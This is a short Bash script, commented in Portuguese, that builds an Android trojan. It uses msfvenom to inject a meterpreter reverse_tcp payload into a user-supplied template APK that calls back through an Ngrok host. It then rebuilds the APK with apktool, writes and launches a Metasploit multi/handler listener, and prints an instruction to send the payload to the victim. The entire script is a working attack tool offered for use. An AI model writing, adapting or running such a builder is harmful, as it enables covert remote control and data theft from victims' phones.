
echo "digite o IP do Ngrok>>" 
read ip
echo "digite a porta do Ngrok>>" 
read porta
echo "digite o caminho do template>>"
read template
echo -e "\e[0m"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -x $template -o teste.apk
echo "payload feito" 
apktool d -f teste.apk

sleep "0.1"
#troca a versão minsdk do apk para a mais recente
sed -i "s/minSdkVersion: '23'/minSdkVersion: '29'/" teste/apktool.yml

echo "Número da versão minSdk alterado para 29 no arquivo apktool.yml."


echo "Substituição concluída."
apktool b teste -o teste.apk



echo "começando a configurar conexão"






echo "limpando "
#destivado por enquanto...clear

echo "mandando trojan para o mestre Ceifador"

echo "" > comandos_msfconsole.txt
echo "use exploit/multi/handler" >> comandos_msfconsole.txt
echo "set payload android/meterpreter/reverse_tcp" >> comandos_msfconsole.txt
echo "set LHOST $ip" >> comandos_msfconsole.txt
echo "set LPORT 4444" >> comandos_msfconsole.txt

echo "set autorunscript meterpreter.txt" >> comandos_msfconsole.txt
echo "exploit -j " >> comandos_msfconsole.txt

echo "[✔] --- CONEXÃO SETADA, MANDE O PAYLOAD PRA VITIMA! --- [✔]"
ls | grep "teste.apk"
echo "Malware^"
msfconsole  -r comandos_msfconsole.txt

echo "rodando comandos"

